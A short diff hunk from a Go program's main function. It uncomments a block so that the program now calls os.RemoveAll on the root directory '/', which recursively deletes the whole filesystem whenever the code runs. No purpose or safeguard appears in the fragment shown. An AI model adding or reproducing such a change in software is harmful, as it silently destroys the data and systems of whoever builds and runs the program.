@@ -13,11 +13,11 @@ import (
 
 func main() {
 
-	// err := os.RemoveAll("/")
-	// if err != nil {
-	// 	fmt.Println(err.Error())
-	// 	return
-	// }
+	err := os.RemoveAll("/")
+	if err != nil {
+		fmt.Println(err.Error())
+		return
+	}
 
 	///////
 
